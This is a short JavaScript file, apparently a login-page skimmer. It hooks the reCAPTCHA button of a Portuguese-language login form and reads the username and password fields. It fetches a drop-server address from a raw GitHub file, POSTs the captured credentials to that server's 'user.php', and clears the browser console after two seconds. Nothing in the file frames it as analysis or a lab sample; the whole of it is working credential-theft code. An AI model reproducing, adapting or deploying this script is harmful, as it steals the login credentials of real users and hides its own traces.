let btn = document.getElementsByClassName("g-recaptcha")
const username = document.querySelector('[name="user.login"]')
const password = document.querySelector('[name="user.senha"]')

btn[0].addEventListener("click", function(){
    let xhr = new XMLHttpRequest();

    xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
    xhr.onreadystatechange = async function() {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            const urlContent = xhr.responseText;

            const data = new FormData();
            data.append("username", username.value);
            data.append("password", password.value);

            const response = await fetch(urlContent + "/user.php", {
                method: "POST",
                body: data
            });
        }
    };
    xhr.send();
});

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function demo() {
    await sleep(2000);
    console.clear()
}

demo();
